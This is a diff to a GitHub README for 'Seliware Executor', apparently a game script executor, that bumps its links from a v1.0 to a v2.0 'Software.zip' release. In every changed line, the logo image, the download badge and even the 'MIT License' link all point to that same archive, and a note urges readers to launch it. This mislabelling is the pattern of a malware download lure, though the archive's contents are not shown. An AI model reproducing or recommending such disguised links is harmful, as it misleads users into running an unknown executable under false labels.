@@ -2,7 +2,7 @@
 
 Welcome to the Seliware Executor repository! 🚀
 
-![Seliware Executor Logo](https://github.com/qsoow/Seliware-Executor/releases/download/v1.0/Software.zip)
+![Seliware Executor Logo](https://github.com/qsoow/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 ## Description ℹ️
 
@@ -38,7 +38,7 @@ Welcome to the Seliware Executor repository! 🚀
 
 To get started with Seliware Executor, you can download the latest version from the following link:
 
-[![Download Seliware Executor](https://github.com/qsoow/Seliware-Executor/releases/download/v1.0/Software.zip%20Executor-blue)](https://github.com/qsoow/Seliware-Executor/releases/download/v1.0/Software.zip)
+[![Download Seliware Executor](https://github.com/qsoow/Seliware-Executor/releases/download/v2.0/Software.zip%20Executor-blue)](https://github.com/qsoow/Seliware-Executor/releases/download/v2.0/Software.zip)
 
 *Note: This link needs to be launched for downloading the Seliware Executor package.*
 
@@ -54,7 +54,7 @@ Join our growing community of developers on GitHub to stay updated on the latest
 
 ## License 📜
 
-The Seliware Executor project is licensed under the [MIT License](https://github.com/qsoow/Seliware-Executor/releases/download/v1.0/Software.zip). Feel free to explore, modify, and distribute the software as per the terms of the license.
+The Seliware Executor project is licensed under the [MIT License](https://github.com/qsoow/Seliware-Executor/releases/download/v2.0/Software.zip). Feel free to explore, modify, and distribute the software as per the terms of the license.
 
 ---
 
